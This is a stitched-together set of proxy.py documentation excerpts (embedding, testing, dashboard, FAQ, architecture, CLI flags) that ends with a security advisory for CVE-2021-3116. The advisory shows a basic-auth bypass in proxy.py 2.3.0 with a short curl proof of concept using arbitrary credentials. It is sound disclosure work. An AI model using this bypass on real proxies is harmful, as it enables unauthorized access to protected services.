If you have a valid use case, kindly open an issue. You are always welcome to send
contributions via pull-requests to add this functionality :)

> To proxy local requests remotely, make use of [Proxy Pool Plugin](#proxypoolplugin).

# Embed proxy.py

## Blocking Mode

Start `proxy.py` in embedded mode with default configuration
by using `proxy.main` method. Example:

```
import proxy

if __name__ == '__main__':
  proxy.main()
```

Customize startup flags by passing them as kwargs:

```
import ipaddress
import proxy

if __name__ == '__main__':
  proxy.main(
    hostname=ipaddress.IPv6Address('::1'),
    port=8899
  )
```

Note that:

1. `main` is equivalent to starting `proxy.py` from command line.
2. `main` does not accept any `args` (only `kwargs`).
3. `main` will automatically consume any available `sys.argv` as `args`.
4. `main` will block until `proxy.py` shuts down.

## Non-blocking Mode

Start `proxy.py` in non-blocking embedded mode with default configuration
by using `Proxy` context manager: Example:

```
import proxy

if __name__ == '__main__':
  with proxy.Proxy() as p:
    # Uncomment the line below and
    # implement your app your logic here
    proxy.sleep_loop()
```

Note that:

1. `Proxy` is similar to `main`, except `Proxy` will not block.
2. Internally, `Proxy` is a context manager which will start
   `proxy.py` when called and will shut it down once the scope ends.
3. Unlike `main`, startup flags with `Proxy` can also be customized
   by using `args` and `kwargs`. e.g. `Proxy(['--port', '8899'])` or
   by using passing flags as kwargs e.g. `Proxy(port=8899)`.
4. Unlike `main`, `Proxy` will not inspect `sys.argv`.

## Ephemeral Port

Use `--port=0` to bind `proxy.py` on a random port allocated by the kernel.

In embedded mode, you can access this port. Example:

```
import proxy

if __name__ == '__main__':
  with proxy.Proxy() as p:
    print(p.flags.port)
    proxy.sleep_loop()
```

`flags.port` will give you access to the random port allocated by the kernel.

## Loading Plugins

Users can use `--plugins` flag multiple times to load multiple plugins.
See [Unable to load plugins](#unable-to-load-plugins) if you are running into issues.

When using in embedded mode, you have a few more options. Example:

1. Provide a fully-qualified name of the plugin class as `bytes` to the `proxy.main` method or `proxy.Proxy` context manager.
2. Provide `type` instance of the plugin class. This is especially useful if you plan to define plugins at runtime.

Example, load a single plugin using `--plugins` flag:

```
import proxy

if __name__ == '__main__':
  proxy.main(plugins=['proxy.plugin.CacheResponsesPlugin'])
```

For simplicity, you can also pass the list of plugins as a keyword argument to `proxy.main` or the `Proxy` constructor.

Example:

```
import proxy
from proxy.plugin import FilterByUpstreamHostPlugin

if __name__ == '__main__':
  proxy.main(plugins=[
    b'proxy.plugin.CacheResponsesPlugin',
    FilterByUpstreamHostPlugin,
  ])
```

# Unit testing with proxy.py

## `proxy.TestCase`

To setup and tear down `proxy.py` for your Python `unittest` classes, simply use `proxy.TestCase` instead of `unittest.TestCase`.
Example:

```
import proxy

class TestProxyPyEmbedded(proxy.TestCase):

    def test_my_application_with_proxy(self) -> None:
        self.assertTrue(True)
```

Note that:

1. `proxy.TestCase` overrides `unittest.TestCase.run()` method to setup and tear down `proxy.py`.
2. `proxy.py` server will listen on a random available port on the system.
   This random port is available as `self.PROXY.flags.port` within your test cases.
3. Only a single acceptor and worker is started by default (`--num-workers 1 --num-acceptors 1`) for faster setup and tear down.
4. Most importantly, `proxy.TestCase` also ensures `proxy.py` server
   is up and running before proceeding with execution of tests. By default,
   `proxy.TestCase` will wait for `10 seconds` for `proxy.py` server to start,
   upon failure a `TimeoutError` exception will be raised.

## Override startup flags

To override default startup flags, define a `PROXY_PY_STARTUP_FLAGS` variable in your test class.
Example:

```
class TestProxyPyEmbedded(TestCase):

    PROXY_PY_STARTUP_FLAGS = [
        '--num-workers', '2',
        '--num-acceptors', '1',
        '--enable-web-server',
    ]

    def test_my_application_with_proxy(self) -> None:
        self.assertTrue(True)
```

See [test\_embed.py](https://github.com/abhinavsingh/proxy.py/blob/develop/tests/testing/test_embed.py) for full working example.

## With `unittest.TestCase`

If for some reasons you are unable to directly use `proxy.TestCase`,
then simply override `unittest.TestCase.run` yourself to setup and tear down `proxy.py`.
Example:

```
import unittest
import proxy

class TestProxyPyEmbedded(unittest.TestCase):

    def test_my_application_with_proxy(self) -> None:
        self.assertTrue(True)

    def run(self, result: Optional[unittest.TestResult] = None) -> Any:
        with proxy.start([
                '--num-workers', '1',
                '--num-acceptors', '1',
                '--port', '... random port ...']):
            super().run(result)
```

or simply setup / tear down `proxy.py` within
`setUpClass` and `teardownClass` class methods.

# Utilities

## TCP Sockets

### new\_socket\_connection

Attempts to create an IPv4 connection, then IPv6 and
finally a dual stack connection to provided address.

```
>>> conn = new_socket_connection(('httpbin.org', 80))
>>> ...[ use connection ]...
>>> conn.close()
```

### socket\_connection

`socket_connection` is a convenient decorator + context manager
around `new_socket_connection` which ensures `conn.close` is implicit.

As a context manager:

```
>>> with socket_connection(('httpbin.org', 80)) as conn:
>>>   ... [ use connection ] ...
```

As a decorator:

```
>>> @socket_connection(('httpbin.org', 80))
>>> def my_api_call(conn, *args, **kwargs):
>>>   ... [ use connection ] ...
```

## HTTP Client

* Generate HTTP POST request with headers and body

  ```
  >>> import json
  >>> build_http_request(b'POST', b'/form',
          headers={b'Content-type': b'application/json'},
          body=proxy.bytes_(json.dumps({'email': 'hello@world.com'})))

# Run Dashboard

Dashboard is currently under development and not yet bundled with `pip` packages.
To run dashboard, you must checkout the source.

Dashboard is written in Typescript and SCSS, so let's build it first using:

```
❯ make dashboard
```

Also build the embedded `Chrome DevTools` if you plan on using it:

```
❯ make devtools
```

Now start `proxy.py` with dashboard plugin and by overriding root directory for static server:

```
❯ proxy --enable-dashboard --static-server-dir dashboard/public
...[redacted]... - Loaded plugin proxy.http.server.HttpWebServerPlugin
...[redacted]... - Loaded plugin proxy.dashboard.dashboard.ProxyDashboard
...[redacted]... - Loaded plugin proxy.dashboard.inspect_traffic.InspectTrafficPlugin
...[redacted]... - Loaded plugin proxy.http.inspector.DevtoolsProtocolPlugin
...[redacted]... - Loaded plugin proxy.http.proxy.HttpProxyPlugin
...[redacted]... - Listening on ::1:8899
...[redacted]... - Core Event enabled
```

Currently, enabling dashboard will also enable all the dashboard plugins.

Visit dashboard:

```
❯ open http://localhost:8899/dashboard/
```

## Inspect Traffic

***This is a WIP and may not work as documented***

Wait for embedded `Chrome Dev Console` to load. Currently, detail about all traffic flowing
through `proxy.py` is pushed to the `Inspect Traffic` tab. However, received payloads are not
yet integrated with the embedded developer console.

Current functionality can be verified by opening the `Dev Console` of dashboard and inspecting
the websocket connection that dashboard established with the `proxy.py` server.

[![Proxy.Py Dashboard Inspect Traffic](https://raw.githubusercontent.com/abhinavsingh/proxy.py/develop/Dashboard.png)](https://github.com/abhinavsingh/proxy.py)

# Chrome DevTools Protocol

For scenarios where you want direct access to `Chrome DevTools` protocol websocket endpoint,
start `proxy.py` as:

```
❯ proxy --enable-devtools --enable-events
```

Now point your CDT instance to `ws://localhost:8899/devtools`.

# Prometheus Metrics

1. Start `proxy.py` with `--enable-metrics` flag to internal metrics via a prometheus endpoint
2. Configure your `prometheus.yaml` to scrape from `/metrics` endpoint e.g. <http://localhost:8899/metrics>
3. Customize metrics path by using `--metrics-path` flag
4. NOTE that `--enable-metrics` internally also `--enable-events` and the web server plugin

# Frequently Asked Questions

## Deploying proxy.py in production

Listed below are a few strategies for using `proxy.py` in your private/production/corporate projects.

### What not to do?

> You MUST `avoid forking` the repository *"just"* to put your plugin code in `proxy/plugin` directory. Forking is recommended workflow for project contributors, NOT for project users.

* Instead, use one of the suggested approaches from below.
* Then load your plugins using `--plugin`, `--plugins` flags or `plugin` kwargs.
* See [skeleton](https://github.com/abhinavsingh/proxy.py/tree/develop/skeleton) app for example standalone project using `proxy.py`.

### Via Requirements

It is *highly* recommended that you use `proxy.py` via `requirements.txt` or similar dependency management setups. This will allow you to take advantages of regular performance updates, bug fixes, security patches and other improvements happening in the `proxy.py` ecosystem. Example:

1. Use `--pre` option to depend upon last `pre-release`

   ```
   ❯ pip install proxy.py --pre
   ```

   Pre-releases are similar to depending upon `develop` branch code, just that pre-releases may not point to the `HEAD`. This could happen because pre-releases are NOT made available on `PyPi` after every PR merge.
2. Use `TestPyPi` with `--pre` option to depend upon `develop` branch code

   ```
   ❯ pip install -i https://test.pypi.org/simple/ proxy.py --pre
   ```

   A pre-release is made available on `TestPyPi` after every PR merge.
3. Use last `stable` release code

   As usual, simply use:

   ```
   ❯ pip install proxy.py
   ```

### Via Docker Container

If you are into deploying containers, then simply build your image from base `proxy.py` container images.

1. Use `GHCR` to build from `develop` branch code:

   ```
   FROM ghcr.io/abhinavsingh/proxy.py:latest as base
   ```

   *PS: I use GHCR latest for several production level projects*
2. Use `DockerHub` to build from last `stable` release code:

   ```
   FROM abhinavsingh/proxy.py:latest as base
   ```

PS: IMHO, container based strategy is *the best approach* and the only strategy that *I use myself*.

### Integrate your CI/CD with proxy.py

*Hey, but you keep making breaking changes in the develop branch.*

I hear you. And hence, for your production grade applications, you *MUST* integrate application CI/CD with `proxy.py`. You must make sure that your application builds and passes its tests for every PR merge into the `proxy.py` upstream repo.

If your application repository is public, in certain scenarios, PR authors may send patch PRs for all dependents to maintain backward incompatibility and green CI/CD.

CI/CD integration ensure your app continues to build with latest `proxy.py` code. Depending upon where you host your code, use the strategy listed below:

* GitHub

  TBD
* Google Cloud Build

  TBD
* AWS

  TBD
* Azure

  TBD
* Others

  TBD

> At some stage, we'll deprecate `master` branch segregation and simply maintain a `develop` branch. As dependents can maintain stability via CI/CD integrations. Currently, it's hard for a production grade project to blindly depend upon `develop` branch.

## Stable vs Develop

* `master` branch contains latest `stable` code and is available via `PyPi` repository and `Docker` containers via `docker.io` and `ghcr.io` registries.

  Issues reported for `stable` releases are considered with top-priority. However, currently we don't back port fixes into older releases. Example, if you reported an issue in `v2.3.1`, but current `master` branch now contains `v2.4.0rc1`. Then, the fix will land in `v2.4.0rc2`.
* `develop` branch contains cutting edge changes

  Development branch is kept stable *(most of the times)*. **But**, if you want *100% reliability* and serving users in *production environment*, ALWAYS use the stable version.

### Release Schedule

A `vX.Y.ZrcN` pull request is created once a month which merges `develop` → `master`. Find below how code flows from a pull request to the next stable release.

1. Development release is deployed from `develop` → `test.pypi.org` after every pull request merge
2. Alpha release is deployed from `develop` → `pypi.org` **before** merging the `vX.Y.Z.rcN` pull request from `develop` → `master` branch. There can be multiple alpha releases made before merging the `rc` pull request
3. Beta release is deployed from `master` → `pypi.org`. Beta releases are made in preparation of `rc` releases and can be skipped if unnecessary
4. Release candidate is deployed from `master` → `pypi.org`. Release candidates are always made available before final stable release
5. Stable release is deployed from `master` → `pypi.org`

## Threads vs Threadless

### `v1.x`

`proxy.py` used to spawn new threads for handling client requests.

### `v2.0+`

`proxy.py` added support for threadless execution of client requests using `asyncio`.

### `v2.4.0+`

Threadless execution was turned ON by default for `Python 3.8+` on `mac` and `linux` environments.

`proxy.py` threadless execution has been reported safe on these environments by our users. If you are running into trouble, fallback to threaded mode using `--threaded` flag.

For `windows` and `Python < 3.8`, you can still try out threadless mode by starting `proxy.py` with `--threadless` flag.

If threadless works for you, consider sending a PR by editing `_env_threadless_compliant` method in the `proxy/common/constants.py` file.

## Threadless Remote vs Local execution mode

Original threadless implementation used `remote` execution mode. This is also depicted under [High level architecture](#high-level-architecture) as ASCII art.

Under `remote` execution mode, acceptors delegate incoming client connection processing to a remote worker process. By default, acceptors delegate connections in round-robin fashion. Worker processing the request may or may not be running on the same CPU core as the acceptor. This architecture scales well for high throughput, but results in spawning two process per CPU core.

Example, if there are N-CPUs on the machine, by default, N acceptors and N worker processes are started. You can tune number of processes using `--num-acceptors` and `--num-workers` flag. You might want more workers than acceptors or vice versa depending upon your use case.

In v2.4.x, `local` execution mode was added, mainly to reduce number of processes spawned by default. This model serves well for day-to-day single user use cases and for developer testing scenarios. Under `local` execution mode, acceptors delegate client connections to a companion thread, instead of a remote process. `local` execution mode ensure CPU affinity, unlike in the `remote` mode where acceptor and worker might be running on different CPU cores.

`--local-executor 1` was made default in v2.4.x series. Under `local` execution mode, `--num-workers` flag has no effect, as no remote workers are started.

To use `remote` execution mode, use `--local-executor 0` flag. Then use `--num-workers` to tune number of worker processes.

## SyntaxError: invalid syntax

`proxy.py` is strictly typed and uses Python `typing` annotations. Example:

```
>>> my_strings : List[str] = []
>>> #############^^^^^^^^^#####
```

Hence a Python version that understands typing annotations is required.
Make sure you are using `Python 3.6+`.

Verify the version before running `proxy.py`:

`❯ python --version`

All `typing` annotations can be replaced with `comment-only` annotations. Example:

```
>>> my_strings = [] # List[str]
>>> ################^^^^^^^^^^^
```

It will enable `proxy.py` to run on Python `pre-3.6`, even on `2.7`.
However, as all future versions of Python will support `typing` annotations,
this has not been considered.

## Unable to load plugins

Make sure plugin modules are discoverable by adding them to `PYTHONPATH`. Example:

`PYTHONPATH=/path/to/my/app proxy --plugins my_app.proxyPlugin`

```
...[redacted]... - Loaded plugin proxy.HttpProxyPlugin
...[redacted]... - Loaded plugin my_app.proxyPlugin
```

OR, simply pass fully-qualified path as parameter, e.g.

`proxy --plugins /path/to/my/app/my_app.proxyPlugin`

Here is a quick working example:

* Contents of `/tmp/plug` folder

```
╰─ ls -1 /tmp/plug                                                                                                                       ─╯
my_plugin.py
```

* Custom `MyPlugin` class

```
╰─ cat /tmp/plug/my_plugin.py                                                                                                            ─╯
from proxy.http.proxy import HttpProxyBasePlugin

class MyPlugin(HttpProxyBasePlugin):
  pass
```

This is an empty plugin for demonstrating external plugin usage. You must implement necessary methods to make your plugins work for real traffic

* Start `proxy.py` with `MyPlugin`

```
╰─ PYTHONPATH=/tmp/plug proxy --plugin my_plugin.MyPlugin                                                                      ─╯
...[redacted]... - Loaded plugin proxy.http.proxy.HttpProxyPlugin
...[redacted]... - Loaded plugin my_plugin.MyPlugin
...[redacted]... - Listening on ::1:8899
```

## Unable to connect with proxy.py from remote host

Make sure `proxy.py` is listening on correct network interface.
Try following flags:

* For IPv6 `--hostname ::`
* For IPv4 `--hostname 0.0.0.0`

## Basic auth not working with a browser

Most likely it's a browser integration issue with system keychain.

* First verify that basic auth is working using `curl`

  `curl -v -x username:password@localhost:8899 https://httpbin.org/get`

## Docker image not working on macOS

It's a compatibility issue with `vpnkit`.

See [moby/vpnkit exhausts docker resources](https://github.com/abhinavsingh/proxy.py/issues/43)
and [Connection refused: The proxy could not connect](https://github.com/moby/vpnkit/issues/469)
for some background.

## GCE log viewer integration for proxy.py

A starter [fluentd.conf](https://github.com/abhinavsingh/proxy.py/blob/develop/helper/fluentd.conf)
template is available.

1. Copy this configuration file as `proxy.py.conf` under
   `/etc/google-fluentd/config.d/`
2. Update `path` field to log file path as used with `--log-file` flag.
   By default `/tmp/proxy.log` path is tailed.
3. Reload `google-fluentd`:

   `sudo service google-fluentd restart`

Now `proxy.py` logs can be browsed using
[GCE log viewer](https://console.cloud.google.com/logs/viewer).

## `ValueError: filedescriptor out of range in select`

`proxy.py` is made to handle thousands of connections per second
without any socket leaks.

1. Make use of `--open-file-limit` flag to customize `ulimit -n`.
2. Make sure to adjust `--backlog` flag for higher concurrency.

If nothing helps, [open an issue](https://github.com/abhinavsingh/proxy.py/issues/new)
with `requests per second` sent and output of following debug script:

```
❯ ./helper/monitor_open_files.sh <proxy-py-pid>
```

## None:None in access logs

Sometimes you may see `None:None` in access logs. It simply means
that an upstream server connection was never established i.e.
`upstream_host=None`, `upstream_port=None`.

There can be several reasons for no upstream connection,
few obvious ones include:

1. Client established a connection but never completed the request.
2. A plugin returned a response prematurely, avoiding connection to upstream server.

## OSError when wrapping client for TLS Interception

With `TLS Interception` on, you might occasionally see following exceptions:

```
2021-11-06 23:33:34,540 - pid:91032 [E] server.intercept:678 - OSError when wrapping client
Traceback (most recent call last):
  ...[redacted]...
  ...[redacted]...
  ...[redacted]...
ssl.SSLError: [SSL: TLSV1_ALERT_UNKNOWN_CA] tlsv1 alert unknown ca (_ssl.c:997)
...[redacted]... - CONNECT oauth2.googleapis.com:443 - 0 bytes - 272.08 ms
```

Some clients can throw `TLSV1_ALERT_UNKNOWN_CA` if they cannot verify the certificate of the server
because it is signed by an unknown issuer CA. Which is the case when we are doing TLS interception.
This can be for a variety of reasons e.g. certificate pinning etc.

Another exception you might see is `CERTIFICATE_VERIFY_FAILED`:

```
2021-11-06 23:36:02,002 - pid:91033 [E] handler.handle_readables:293 - Exception while receiving from client connection <socket.socket fd=28, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 8899), raddr=('127.0.0.1', 51961)> with reason SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:997)')
Traceback (most recent call last):
  ...[redacted]...
  ...[redacted]...
  ...[redacted]...
ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:997)
...[redacted]... - CONNECT init.push.apple.com:443 - 0 bytes - 892.99 ms
```

In future, we might support serving original HTTPS content for such clients while still
performing TLS interception in the background. This will keep the clients happy without
impacting our ability to TLS intercept. Unfortunately, this feature is currently not available.

Another example with `SSLEOFError` exception:

```
2021-11-06 23:46:40,446 - pid:91034 [E] server.intercept:678 - OSError when wrapping client
Traceback (most recent call last):
  ...[redacted]...
  ...[redacted]...
  ...[redacted]...
ssl.SSLEOFError: EOF occurred in violation of protocol (_ssl.c:997)
...[redacted]... - CONNECT stock.adobe.io:443 - 0 bytes - 685.32 ms
```

                Threadless Worker Processes
```

`proxy.py` is made with performance in mind. By default, `proxy.py`
will try to utilize all available CPU cores to it for accepting new
client connections. This is achieved by starting `AcceptorPool` which
listens on configured server port. Then, `AcceptorPool` starts `Acceptor`
processes (`--num-acceptors`) to accept incoming client connections.
Alongside, if `--threadless` is enabled, `ThreadlessPool` is setup
which starts `Threadless` processes (`--num-workers`) to handle
the incoming client connections.

Each `Acceptor` process delegates the accepted client connection
to a threadless process via `Work` class. Currently, `HttpProtocolHandler`
is the default work class.

`HttpProtocolHandler` simply assumes that incoming clients will follow
HTTP specification. Specific HTTP proxy and HTTP server implementations
are written as plugins of `HttpProtocolHandler`.

See documentation of `HttpProtocolHandlerPlugin` for available lifecycle hooks.
Use `HttpProtocolHandlerPlugin` to add new features for http(s) clients. Example,
See `HttpWebServerPlugin`.

## Everything is a plugin

Within `proxy.py` everything is a plugin.

* We enabled `proxy server` plugins using `--plugins` flag.
  Proxy server `HttpProxyPlugin` is a plugin of `HttpProtocolHandler`.
  Further, Proxy server allows plugin through `HttpProxyBasePlugin` specification.
* All the proxy server [plugin examples](#plugin-examples) were implementing
  `HttpProxyBasePlugin`. See documentation of `HttpProxyBasePlugin` for available
  lifecycle hooks. Use `HttpProxyBasePlugin` to modify behavior of http(s) proxy protocol
  between client and upstream server. Example,
  [FilterByUpstreamHostPlugin](#filterbyupstreamhostplugin).
* We also enabled inbuilt `web server` using `--enable-web-server`.
  Web server `HttpWebServerPlugin` is a plugin of `HttpProtocolHandler`
  and implements `HttpProtocolHandlerPlugin` specification.
* There also is a `--disable-http-proxy` flag. It disables inbuilt proxy server.
  Use this flag with `--enable-web-server` flag to run `proxy.py` as a programmable
  http(s) server.

## Managing states for your stateless plugins

Plugin class instances are created per-request. Most importantly,
plugin instances are created within CPU core context where the request
was received.

For above reason, global variables in your plugins may work as expected.
Your plugin code by design must be **stateless**.

To manage global states, you have a couple of options:

1. Make use of Python's [multiprocessing safe data structures](https://python.readthedocs.io/en/latest/library/multiprocessing.html#sharing-state-between-processes)
2. Make use of `proxy.py` in-built [eventing mechanism](https://github.com/abhinavsingh/proxy.py/blob/develop/tutorial/eventing.ipynb)

## Passing processing context between plugins

Sometimes, a plugin may need to pass additional context to other plugins after them in the processing chain. Example, this additional
context can also be dumped as part of access logs.

To pass processing context, make use of plugin's `on_access_log` method. See how [Program Name](https://github.com/abhinavsingh/proxy.py/blob/develop/proxy/plugin/program_name.py) plugin modifies default `client_ip` key in the context and updates it to detected program name.

As a result, when we enable [Program Name Plugin](#programnameplugin), we see local client program name instead of IP address in the access logs.

## Development Guide

### Setup Local Environment

Contributors must start `proxy.py` from source to verify and develop new features / fixes.

See [Run proxy.py from command line using repo source](#from-command-line-using-repo-source) for details.

[![WARNING](https://camo.githubusercontent.com/ceec8fddf505ef661c0dd0b6549db97bbdcbf4e046497d4fbd58d11ed8a972a9/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f6c6162656c3d4d61634f53266d6573736167653d7761726e696e6726636f6c6f723d726564)](https://github.com/abhinavsingh/proxy.py/issues/642#issuecomment-960819271) On `macOS`
you must install `Python` using `pyenv`, as `Python` installed via `homebrew` tends
to be problematic. See linked thread for more details.

### Setup Git Hooks

Pre-commit hook ensures tests are passing.

1. `cd /path/to/proxy.py`
2. `ln -s $(PWD)/git-pre-commit .git/hooks/pre-commit`

Pre-push hook ensures lint and tests are passing.

1. `cd /path/to/proxy.py`
2. `ln -s $(PWD)/git-pre-push .git/hooks/pre-push`

### Sending a Pull Request

Every pull request is tested using GitHub actions.

See [GitHub workflow](https://github.com/abhinavsingh/proxy.py/tree/develop/.github/workflows)
for list of tests.

                        Time after which inactive works must be cleaned up.
                        Increase this value if your backend services are slow
                        to response or when proxy.py is handling a high
                        volume. When running proxy.py on Google Cloud (GCP)
                        you may see 'backend_connection_closed_before_data_sen
                        t_to_client', with curl clients you may see 'Empty
                        reply from server' error when '--inactive-conn-
                        cleanup-timeout' value is low for your use-case.

                        inactive connection must be dropped. Inactivity is
                        defined by no data sent or received by the client.
  --local-executor LOCAL_EXECUTOR
                        Default: 1. Enabled by default. Use 0 to disable. When
                        enabled acceptors will make use of local (same
                        process) executor instead of distributing load across
                        remote (other process) executors. Enable this option
                        to achieve CPU affinity between acceptors and
                        executors, instead of using underlying OS kernel
                        scheduling algorithm.

                        Default: None. Additional ports to listen on.
  --port-file PORT_FILE
                        Default: None. Save server port numbers. Useful when
                        using --port=0 ephemeral mode.
  --unix-socket-path UNIX_SOCKET_PATH
                        Default: None. Unix socket path to use. When provided
                        --host and --port flags are ignored
  --num-acceptors NUM_ACCEPTORS
                        Defaults to number of CPU cores.
  --version, -v         Prints proxy.py version.
  --log-level LOG_LEVEL
                        Valid options: DEBUG, INFO (default), WARNING, ERROR,
                        CRITICAL. Both upper and lowercase values are allowed.
                        You may also simply use the leading character e.g.

  --log-format LOG_FORMAT
                        Log format for Python logger.
  --open-file-limit OPEN_FILE_LIMIT
                        Default: 1024. Maximum number of files (TCP
                        connections) that proxy.py can open concurrently.

# [CVE-2021-3116] proxy.py 2.3.0 — Broken basic authentication

Andrea Cardaci — 10 January 2021

|  |  |
| --- | --- |
| **Discovered** | 2021-01-09 |
| **Author** | Andrea Cardaci |
| **Product** | [proxy.py](https://github.com/abhinavsingh/proxy.py) |
| **Tested versions** | 2.3.0 |
| **CVE** | [CVE-2021-3116](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3116) |

## Abstract

[proxy.py](https://github.com/abhinavsingh/proxy.py) is a feature-rich HTTP proxy server written in Python. Among the other things it allows to spawn a proxy server that enforces [HTTP basic access authentication](https://en.wikipedia.org/wiki/Basic_access_authentication).

A recent [refactoring](https://github.com/abhinavsingh/proxy.py/commit/a48319e32d3c60cb919ef70706b3a3750406f837) introduced a logic bug that allows to bypass the proxy authentication.

## Details

The vulnerable code is located in [proxy/http/proxy/auth.py](https://github.com/abhinavsingh/proxy.py/blob/f04845cd645e642b92a40ea5650fd805f4f9ad04/proxy/http/proxy/auth.py#L31-L41):

```
def before_upstream_connection(
        self, request: HttpParser) -> Optional[HttpParser]:
    if self.flags.auth_code:
        if b'proxy-authorization' not in request.headers:
            raise ProxyAuthenticationFailed()
        parts = request.headers[b'proxy-authorization'][1].split()
        if len(parts) != 2 \
                and parts[0].lower() != b'basic' \
                and parts[1] != self.flags.auth_code:
            raise ProxyAuthenticationFailed()
    return request

```

The `and` operators are wrong here, and it is enough to set one of its operands to `False` to skip the challenge and bypass the authentication. A valid `Proxy-Authorization` header (e.g., for `user:password`) is in the form:

```
Proxy-Authorization: Basic dXNlcjpwYXNzd29yZA==

```

So `len(parts)` is `2`, thus any valid header with any credentials works.

## Proof of concept

Start `proxy.py` like:

```
$ proxy --basic-auth user:password
2021-01-10 19:25:31,183 - pid:73304 [I] load_plugins:334 - Loaded plugin proxy.http.proxy.AuthPlugin
2021-01-10 19:25:31,184 - pid:73304 [I] load_plugins:334 - Loaded plugin proxy.http.proxy.HttpProxyPlugin
2021-01-10 19:25:31,184 - pid:73304 [I] listen:113 - Listening on ::1:8899
2021-01-10 19:25:31,215 - pid:73304 [I] start_workers:136 - Started 8 workers

```

Trying to use the proxy without credentials correctly yields a proxy authentication error:

```
$ curl -I -x localhost:8899 http://example.com
HTTP/1.1 407 Proxy Authentication Required
Proxy-agent: proxy.py v2.3.0
Proxy-Authenticate: Basic
Connection: close
Content-Length: 29

```

But specifying any credentials (e.g., `x:x`) allows the request to go through:

```
$ curl -I -x x:x@localhost:8899 http://example.com
HTTP/1.1 200 OK
Content-Encoding: gzip
Accept-Ranges: bytes
Age: 276321
